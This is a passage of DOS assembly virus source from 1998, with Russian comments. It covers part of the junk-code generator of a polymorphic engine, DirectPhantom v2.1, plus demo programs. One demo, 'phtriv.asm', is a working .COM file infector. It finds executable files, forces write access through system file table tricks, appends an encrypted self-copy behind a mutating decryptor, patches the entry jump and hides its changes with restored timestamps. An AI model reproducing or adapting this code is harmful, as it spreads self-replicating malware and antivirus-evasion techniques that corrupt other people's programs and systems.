db	00111000b,11b,0 			; CMP REG,REG/MEM
db	10000100b,01b,0 			; TEST REG,REG/MEM
db	11000110b,01b+TR+CMDinRM+TRM+ImmF,0	; MOV REG,Imm8/16
db	10000000b,01b+TR+CMDinRM+TRM+ImmF,111b	; ARCMD REG,Imm8/16
db	11110110b,01b+TR+CMDinRM+ImmF,0 	; TEST REG/MEM,Imm8/16
db	11111110b,01b+TR+CMDinRM+TRM,1		; INC/DEC REG
db	11110110b,01b+TR+CMDinRM+TRM,1+010000b	; NOT/NEG REG
db	11110110b,01b+TR+CMDinRM,1+100000b+KillAD    ; MUL/IMUL REG/MEM
db	10001100b,00b+TR+CMDinRM+TRM,11b	; MOV REG,SREG
db	11010000b,01b+TR+CMDinRM+TRM,111b	; SHIFT REG,1
db	11010010b,01b+TR+CMDinRM+TRM,111b	; SHIFT REG,CL

; Замечания :
;		Нет сдвигового мусора через НОП imm8
;		Нет расширения НОП'а до полного размера в ARCMD , S=0

ENDRMTAB	equ	$

; Таблица offset'ов на SUB'ы
SUBOFFS 	dq	0h
		dq	0h

; Таблица простого мусора

RotF		equ	00000010b
KillAX		equ	00001000b
SmplyCMD	equ	01110000b

SimplyTAB	equ	$

db	10110000b,01b+TR+ImmF			; MOV REG,Imm8/16
db	10010000b,00b+TR+KillAX 		; XCHG AX,REG
db	01000000b,00b+TR+RotF+10000b		; INC/DEC REG
db	10100001b,00b+KillAX+ImmF		; MOV AX,MEM
db	00000100b,01b+KillAX+RotF+ImmF+SmplyCMD ; ARCMD AL/AX,Imm8/16
db	10101000b,01b+ImmF			; TEST AL/AX,Imm8/16
db	00100111b,00b+KillAX+RotF+110000b	; DAA/DAS/AAA/AAS
db	11111000b,00b+1010000b			; STI,CLI,STD,CLD,STC,CLC
db	11110101b,00b				; CMC
db	10011000b,00b+KillAX			; CBW
db	11010111b,00b+KillAX			; XLAT
db	11001100b,00b				; INT 3
db	10011110b,00b+KillAX+10000b		; SAHF,LAHF
db	10010000b,00b				; NOP
db	00100110b,00b+RotF+110000b		; ES/CS/SS/DS

SimplyEND	equ	$

; Замечания :
;		Нет мусора ввода в аккумулятор из порта
;		Нет мусора AAM,AAD
;		Нет MOV AL,MEM

; Таблица мусорных процедур

TRCMDs		dw	offset SimplyTRASH
		dw	offset SUBROUTINE
		dw	offset CALLtoSUB
		dw	offset RMTRASH
		dw	offset JUMPTRASH
		dw	offset PUSHPOPTRASH
TREND		equ	$
;----------------------------------------------------------------------------

GETVAL		proc
;		Взять значение по случайному индексу
		call	RND
		shl	dl,1
		movzx	bx,dl
		mov	ax,[si+bx]
		ret
GETVAL		endp
;-------------------
GETTRASHREG	proc
		bt	bx,Wbit       ; Истинный Wbit
		cmc
		call	GETFREEREG    ; Берем незанятый регистр
		call	FREEREG       ; Но не помечаем его как занятый -
				      ; это же мусор
		ret
GETTRASHREG	endp
;-------------------
AddImmediate	proc
; Добавление непосредственного операнда
		test	bl,ImmF
		jz	ExitImmed

		in	al,40h
		stosb
		bt	bx,Wbit
		jnc	ExitImmed
		in	al,40h
		stosb
ExitImmed:
		ret
AddImmediate	endp
;-------------------
AddXtraCMD	PROC
; Добавление дополнительной команды
		mov	dl,bh
		and	dl,XtraCOP
		or	al,dl

		mov	dl,bh	      ; Добавляем дополнительную команду
		and	dl,XtraCMD
		call	RND
		shl	dl,3	      ; влево на 3
		or	al,dl
		ret
AddXtraCMD	ENDP
;-------------------
MAKE_WDbits	PROC
; Enter : Bl - flags
; Exit	: Dl - WDbits
;	  Bl - Real WDbits

		mov	cl,bl	       ; CL - индекс WDbits
		and	bl,NOT WDbit   ; Сбросим индекс WDbits
		and	cl,WDbit
		pushf
		push	ax
;			   ┌┬─┬─┬──────── RND bits
		mov	dl,10100100b
WDbits		equ	$ - 1
		shl	cl,1
		shr	dl,cl
		and	dl,3

		in	al,40h
		and	al,11010100b
		xor	byte ptr [WDbits],al

		pop	ax
		or	al,dl	       ; Истинные биты W и D
		or	bl,dl	       ; Во флаге команды заменим индекс WD
				       ; на истинное значение
		popf
		jnz	ExitWDbits
		inc	bx	       ; Если Wbit не присутствует в команде
				       ; то он по умолчанию W=1
ExitWDbits:
		ret
MAKE_WDbits	ENDP
;-------------------
MAKE_ModeRM	PROC
; Enter : AL - ModeRM байт
;	  BX - status с RealWD

		test	bl,TR
		jnz	COPorREG

		mov	dl,7	      ; Не тестируем регистр
		call	RND
		jmp	AddREG
COPorREG:
		test	bl,CMDinRM
		jz	AddFreeREG

		call	AddXtraCMD    ; Добавим команду
		jmp	REGMEM
AddFreeREG:
		call	GETTRASHREG    ; Берем незанятый регистр
AddREG:
		shl	dl,3	      ; + REG
		or	al,dl
REGMEM:
		test	bl,TRM
		jnz	TestRM

		mov	dl,3	     ; Mode
		test	bl,MemOnly   ; Mode!=11b - только в память
		jz	falce
		dec	dl
falce:
		call	RND
		mov	dh,dl	     ; DH=Mode

		mov	dl,7	     ; DL=REG/MEM
		call	RND
		jmp	RMdone
TestRM:
		call	GETTRASHREG
		mov	dh,3
RMdone:
		ror	dh,2
		or	al,dh	      ; + Mode
		or	al,dl	      ; + RM
		stosb

		test	dh,dh		 ; Индексная без НОП'a
		jnz	NextMode
		cmp	dl,00000110b	 ; НОП операнд MEM
		je	Index16

NextMode:
		cmp	dh,01000000b	 ; Индексная + imm8
		je	Index8
		cmp	dh,10000000b	 ; Регистровая адресация
		jne	ExitModeRM
Index16:				 ; Индексная + imm16
		in	al,40h
		and	al,7Fh
		stosb
Index8:
		in	al,40h
		and	al,7Fh
		stosb
ExitModeRM:
		ret
MAKE_ModeRM	ENDP
;-------------------
FinishJP	proc
		push	ax
		test	al,JRQ
		jz	FinishPP
		call	JUMPTRASH	   ;закроем JMP
FinishPP:
		pop	ax
		push	ax
		test	al,PRQ
		jz	JPisFinished
		call	PUSHPOPTRASH	   ;закроем PUSH/POP
JPisFinished:
		pop	ax
		ret
FinishJP	endp
;-------------------
JUMPTRASH	PROC
;		Мусор из условных переходов

		test	[PH_FLAGS],JRQ
		jnz	AddRel8toJMP	      ;Закончим Jump

		mov	al,01110000B	      ;Jxx Rel8

		mov	dl,0Fh
		call	RND

		or	al,dl	;Тип Jump'a готов
		stosb

		mov	word ptr [JmpPLACE],di	 ;адрес места для Relative

		inc	di
		or	[PH_FLAGS],JRQ	;Установим Jump Request
		ret
AddRel8toJMP:
		mov	ax,di
		mov	bx,1234h
JmpPLACE	equ	$ - 2
		sub	ax,bx
		dec	al
		mov	es:[bx],al

		xor	[PH_FLAGS],JRQ ;Сбросим запрос на завершение Jmp'a
		ret
JUMPTRASH	ENDP
;-------------------
PUSHPOPTRASH	PROC
;		Мусорные push'истые pop'ы

		test	[PH_FLAGS],JRQ	; Если есть флаг запроса jmp'a ,то
					; делать PUSH/POP нельзя
		jnz	PPExit

		mov	al,01010000b	; PUSH/POP

		test	[PH_FLAGS],PRQ	; PUSH/POP request is set ?
		jnz	MakePOP
MakePUSH:
		and	[PH_FLAGS],not PRQ

		mov	dl,7		; RND регистр или SREG
		call	RND
		call	DROPCOIN	; PUSH reg или PUSH Sreg
		jz	DonePUSHPOP

		mov	al,00000110b	; PUSH Sreg
		and	dl,00000011b
		shl	dl,3
		jmp	DonePUSHPOP
MakePOP:
		or	al,00001000b	; POP Reg
		clc
		call	GETFREEREG
		call	FREEREG
		or	[PH_FLAGS],PRQ
DonePUSHPOP:
		or	al,dl
		stosb
		xor	[PH_FLAGS],PRQ
PPExit:
		ret
PUSHPOPTRASH	ENDP
;-------------------
SUBROUTINE	PROC

		mov	ax,word ptr [PH_FLAGS]	 ; Расширенные флаги

		test	al,SRQ		 ; SRQ установлен ?
		jnz	FinishSUB

		test	al,CRQ		 ; Не делаем процедуру
		jz	SUBExit 	 ; если нет CALL'a

		test	ax,JRQ or PRQ or MSR  ; Не делаем процедуру
		jnz	SUBExit 	      ; если JRQ,PRQ=1
					      ; Или замаскировано

		or	al,SRQ		 ; Установим SUB request
		and	al,not FCR	 ; Теперь можно делать CALL'ы

		mov	[PH_FLAGS],al

		mov	al,0E9h 	 ; JMP Relative 8 bit
		stosb
		mov	word ptr [JMPovrSUB],di
		inc	di
		inc	di

		call	RMTRASH 	; + маленько мусора
		call	SimplyTRASH

		mov	bx,0000b
SubPtr		equ	$ - 2

		mov	[bx+offset SUBOFFS],di	; Заносим адрес процедуры
		inc	bx			; в таблицу смещений на SUB'ы
		inc	bx
		and	bx,00000111b		; таблица из 4х релокейшнов
		mov	word ptr [SubPtr],bx
		jmp	SUBExit
FinishSUB:
		call	FinishJP	; Закончим JMP и PUSH/POP мусор
					; (если он есть)
		call	SimplyTRASH
		call	RMTRASH

		mov	al,0C3h
		stosb

		mov	bx,0000h
JMPovrSUB	equ	$ - 2
		mov	ax,di
		sub	ax,bx
		dec	ax
		dec	ax
		mov	es:[bx],ax
		xor	[PH_FLAGS],SRQ
SUBExit:
		ret
SUBROUTINE	ENDP
;-------------------
CALLtoSUB	PROC

		mov	ax,word ptr [PH_FLAGS]

		test	ax,MSR		 ; Установлен MaskCALL/SUBRequest ?
		jnz	ExitCALL	 ; Запрещено внешней программой

		test	al,CRQ		 ; Завершим
		jnz	FinishCALL

		or	al,CRQ or FCR	 ; Запретим завершение CALL'a
					 ; пока не будет сделана хоть
					 ; одна SUB'рутина
		mov	[PH_FLAGS],al

		mov	al,0E8h
		stosb
		mov	word ptr [CALLPlace],di
		inc	di
		inc	di
		jmp	ExitCALL

FinishCALL:
		test	al,FCR	   ; Finish CALL Request is Set ?
		jnz	ExitCALL   ; Да - процедуры не сделано
NextSUB:
		mov	dl,00000011b	  ; 4 offset'a на CALL'ы
		mov	si,offset SUBOFFS
		call	GETVAL

		mov	bx,1234
CALLPlace	equ	$ - 2

		sub	ax,bx	       ; Зто старая SUB'рутина
		jc	NextSUB        ; Берем другую

		sub	ax,2
		mov	es:[bx],ax
		xor	[PH_FLAGS],CRQ
ExitCALL:
		ret
CALLtoSUB	ENDP
;-------------------
RMTRASH 	PROC

		mov	dl,(ENDRMTAB-RMTAB)/3-1
		call	RND

		xchg	al,dl
		mov	dl,3
		mul	dl

		movzx	bx,al	       ; Index

		mov	al,[bx+offset RMTAB]	 ; Load Code Operation
		mov	bx,[bx+offset RMTAB+1]	 ; Load Status Word

		test	bh,KillAD
		jz	SimplyCMD      ; Портит ли команда AX,DX ?

		test	[REG_USED],00000101b ; А можно ли ?
		jnz	ExitRMtrash
SimplyCMD:
		call	MAKE_WDbits    ; Сделаем биты W и D

		test	bl,CMDinCOP    ; Есть дополнительная команда ?
		jz	OneCommand
		call	AddXtraCMD
OneCommand:
		stosb
		xor	al,al	       ; байт ModeRM
		call	MAKE_ModeRM
		call	AddImmediate
ExitRMtrash:
		ret
RMTRASH 	ENDP
;-------------------
SimplyTRASH	proc

		mov	dl,(SimplyEND - SimplyTAB)/2-1
		mov	si,offset SimplyTAB	    ; AL - COP
		call	GETVAL			    ; AH - StatByte

		test	ah,KillAX
		jz	GoodCMD      ; Портит ли команда AX ?

		test	[REG_USED],00000001b ; А можно ли ?
		jnz	ExitSimply
GoodCMD:
		mov	bl,ah

		mov	dh,RotF 	; Выделим бит RotF
		and	dh,bl
		xor	bl,dh

		mov	bh,al
		xor	al,al
		call	Make_WDbits
		or	bl,dh		; Установим обратно бит RotF

		test	bl,TR
		jz	DontREG

		shl	al,3
		or	al,bh

		call	GETTRASHREG	; Берем незанятый регистр
		or	al,dl
		jmp	AddCMD
DontREG:
		or	al,bh
AddCMD:
		mov	dl,bl
		and	dl,SmplyCMD
		ror	dl,4
		call	RND
		test	bl,RotF
		jz	DontRot
		shl	dl,3
DontRot:
		or	al,dl
		stosb
		call	AddImmediate
ExitSimply:
		ret
SimplyTRASH	endp
;-------------------
TRCHAIN 	proc
		pusha

		mov	dl,8	 ; От 8 до 16 мусорных команд
		call	RND
		add	dl,8
		movzx	cx,dl
AddTRCommand:
		push	cx

		mov	si,offset TRCMDs   ; массив мусорных процедур
		mov	dl,(TREND-TRCMDs)/2-1
		call	GETVAL		   ; Возьмем offset
		call	ax		   ; Вызовем

		pop	cx
		loop	AddTRCommand

		mov	al,[PH_FLAGS]
		call	FinishJP	   ; Закончим JMP и PUSH/POP trash

		test	al,SRQ
		jz	ExitTRchain
		call	SUBROUTINE	   ; Закончим SUB'рутину
		call	RMTRASH
ExitTRchain:
		pop	ax		   ; Не имеет значения
		push	di
		popa
		ret
TRCHAIN 	endp
;-------------------
FinishTR	proc

		test	[PH_FLAGS],CRQ
		jz	ExitTRASH

		test	[PH_FLAGS],FCR	 ; Нечем заканчивать CALL -
		jnz	KillCALL	 ; не сделали ни одной SUB'рутины
		call	CALLtoSUB
		jmp	ExitTRASH
KillCALL:
		mov	bx,word ptr [CALLPlace]
		mov	byte ptr es:[bx-1],90h

		mov	dx,26F8h	 ; ES/CS/SS/DS,STI/CLI/STD/CLD
		in	ax,40h
		and	ax,1803h
		xor	dx,ax
		mov	es:[bx],dx
ExitTRASH:
		ret
FinishTR	endp
===== end    trash.asm =====


Демки для полигенератора :

===== begin phtriv.asm =====
; ASM & LINK to PHTRIV.EXE
; EXE2BIN to PHTRIV.COM

		.model	tiny
		.486
PHANTOMtrivial	segment para public use16 'code'
		assume	cs:PHANTOMtrivial,ds:PHANTOMtrivial
TRIVIAL:
		call	BASE
BASE:		pop	si
		sub	si,3
		mov	bx,si

		xor	di,di
		mov	ax,cs
		add	ah,10h
		mov	es,ax
		mov	cx,TRIVIALen
		cld
		rep	movsb
		push	es
		push	offset CONTINUE

		mov	di,100h
		lea	si,[bx+OLDBYTES]
		cld
		push	cs
		pop	es
		movsb
		movsw
		retf
CONTINUE:
		cli
		sub	sp,2Ch	; Размер DTA
		mov	dx,sp
		push	ss
		pop	ds
		mov	ah,1Ah
		int	21h

		push	cs
		pop	ds
		mov	[DTA],dx
		sti

		mov	cx,00010111b   ; Атрибуты (скрытый,архивный,RDonly)
		mov	ah,4Eh
		lea	dx,[COMMASK]
FindNext:
		int	21h
		jc	RESTORE_REGS

		mov	dx,cs:[DTA]
		add	dx,1Eh

		push	ss
		pop	ds

		mov	ax,3D00h
		int	21h

		push	cs
		pop	ds
		mov	[HANDLE],ax

		push	ax
		pop	bx

		mov	ax,1220h	;Номер входа в SFT
		int	2Fh		;es:[di]

		mov	bl,es:[di]	;Получим блок описания файла
		mov	ax,1216h	;es:di
		int	2Fh

		mov	word ptr [FPB],di
		mov	word ptr [FPB+2],es

		mov	word ptr es:[di+2],2   ; Режим Read/Write

		mov	ax,es:[di+0Dh]
		mov	dl,al
		mov	dh,1Fh
		and	dl,dh
		cmp	dl,dh
		je	NextFile

		or	al,dh
		mov	word ptr [TIME],ax
		mov	ax,es:[di+0Fh]
		mov	word ptr [DATE],ax

		mov	bx,[HANDLE]
		lea	dx,[OLDBYTES]
		mov	ah,3Fh
		mov	cx,3
		int	21h

		mov	ax,word ptr es:[di+11h]
		add	ax,100h
		jc	NextFile
		mov	[RELOFFS],ax

		mov	ax,cs
		mov	dx,TRIVIALen
		shr	dx,4
		inc	dx
		add	ax,dx
		mov	es,ax
		shl	eax,10h

		mov	[TARGETPLACE],eax
		mov	[DEST_CODE],0FFFFh
		mov	[COUNTER],TRIVIALen

		call	PHANTOM

		xor	si,si
		mov	cx,TRIVIALen
		rep	movsb
		push	di

		call	JuNk_DOiT

		pop	cx
		mov	ax,cx

		add	ax,[RELOFFS]
		jc	NextFile

		lds	di,[FPB]

		mov	word ptr dx,ds:[di+11h]
		mov	word ptr ds:[di+15h],dx

		push	ds
		pop	es

		sub	dx,3
		mov	word ptr cs:[TRIVJUMP+1],dx

		push	word ptr cs:[TARGETPLACE+2]
		pop	ds

		xor	dx,dx
		mov	bx,cs:[HANDLE]
		mov	ah,40h
		int	21h

		xor	dx,dx
		mov	word ptr es:[di+15h],dx

		push	cs
		pop	ds
		mov	dx,offset TRIVJUMP
		mov	cx,3
		mov	ah,40h
		int	21h

		mov	ax,5701h
		mov	cx,0000h
TIME		equ	$ - 2
		mov	dx,0000h
DATE		equ	$ - 2
		int	21h

		mov	ah,3Eh
		int	21h
RESTORE_REGS:
		push	cs
		pop	ax
		sub	ah,10h
		mov	word ptr cs:[PROGSEG],AX
		push	ax
		pop	ds
		push	ds
		pop	es

		cli
		add	sp,2Ch
		sti

		mov	dx,80h
		mov	ah,1Ah
		int	21h

		xor	ax,ax
		xor	bx,bx
		xor	cx,cx
		xor	dx,dx
		xor	si,si
		xor	di,di
		xor	bp,bp
		db	0EAh	  ; Вылетаем в программу
		dw	100h
PROGSEG:	dw	0000h

NextFile:
		mov	bx,[HANDLE]
		mov	ah,3Eh
		int	21h

		mov	ah,4Fh
		mov	dx,[DTA]
		push	ss
		pop	ds
		jmp	FindNext

;─────────────────────────────────────────────────
include 	phantom.asm
include 	trash.asm
;────────────── TRIVIAL DATA AREA ────────────────

CopyLeft	db	'PHANTOMtrivial - beta tester of DirectPhantom v2.1',0
Author		db	'(C)1998 Nsk,NSTU by DaemonSerJ',0
DTA		dw	0
TRIVJUMP	db	0E9h
		dw	0
OLDBYTES	db	0C3h,90h,90h
HANDLE		dw	0

FPB		dd	0

RELOFFS 	dw	0
DEST_CODE	dw	0
COUNTER 	dw	0
TARGETPLACE	dd	0
LENDECRYPTOR	dw	0
COMMASK 	db	'*.COM',0

TRIVIALen	equ	offset $

PHANTOMtrivial	ends
		end	TRIVIAL

===== end   phtriv.asm =====

===== begin phtest.asm =====
		.486
		MODEL	TINY
CSEG		SEGMENT PARA PUBLIC USE16 'CODE'
		ASSUME	CS:CSEG,DS:CSEG
		ORG	100H
START:
		PUSH	CS
		POP	DS

		mov	bx,1000h
		mov	ah,4Ah
		int	21h
		jc	exit

		mov	ah,48h
		mov	bx,40h
		int	21h
		jc	exit
		mov	es,ax

		movzx	eax,ax
		rol	eax,10h
		mov	[TARGETPLACE],eax
		mov	[RELOFFS],100h
		mov	[DEST_CODE],0FFFFh
		mov	[COUNTER],PrgLen

		call	PHANTOM

		mov	si,offset Demo
		mov	cx,PrgLen
		cld
		rep	movsb

		call	JuNK_DOIT

		mov	ah,3Ch
		mov	dx,offset FILE
		xor	cx,cx
		int	21h

		mov	bx,ax

		mov	ah,40h
		mov	cx,PrgLen
		add	cx,[LenDecryptor]
		lds	dx,[targetplace]
		int	21h

		mov	ah,3Eh
		int	21h

		sti
		mov	es,word ptr cs:[targetplace+2]
		mov	ah,49h
		int	21h
exit:
		mov	ax,4C00h
		int	21h

;----------------------------------------------------------------------------
demo:
		call	Print
		db	13,10,'DirectPhantom v2.1 with SUB & CALL Trash !'
		db	13,10,'$'
Print:		pop	dx
		mov	ah,9
		int	21h
		mov	ax,4C00h
		int	21h
PrgLen		equ	$ - demo

FILE		db 'phdemo.com',0
		dq 0ffffffffffffffffh
;----------------------------------------------------------------------------

reloffs 	dw 0
dest_code	dw 0
counter 	dw 0
targetplace	dd 0
lendecryptor	dw 0

include 	phantom.asm
include 	trash.asm

CSEG		ENDS
                END     START
===== end   phtest.asm =====

===== begin trashtst.asm =====
		.486
		MODEL	TINY
CSEG		SEGMENT PARA PUBLIC USE16 'CODE'
		ASSUME	CS:CSEG,DS:CSEG
		ORG	100H
START:

		PUSH	CS
		POP	DS

		mov	bx,1000h
		mov	ah,4Ah
		int	21h

		mov	ah,48h
		mov	bx,200h
		int	21h
		jnc	OKKK
		int	20h
OKKK:
		mov	es,ax
		xor	di,di

		mov	cx,100
cycle:
		push	cx
		call	TRCHAIN
		mov	eax,90909090h
		stosd
		pop	cx
		loop	cycle

		call	FinishTR

		mov	al,0C3h
		stosb

		mov	ah,3ch
		xor	cx,cx
		mov	dx,offset file
		int	21h

		mov	bx,ax

		mov	ah,40h
		mov	cx,di
		push	ds
		push	es
		pop	ds
		xor	dx,dx
		int	21h

		pop	ds
		mov	ah,3eh
		int	21h

		mov	ah,49h
		int	21h

		int	20h

file		db	'trash.com',0

dq 0FFFFFFFFFFFFFFFFh
;-----------------------------------------------------------------------------

reloffs 	dw 0
dest_code	dw 0
counter 	dw 0
targetplace	dd 0
lendecryptor	dw 0

include 	trash.asm
include 	phantom.asm

CSEG		ENDS
                END     START
===== end   trashtst.asm =====
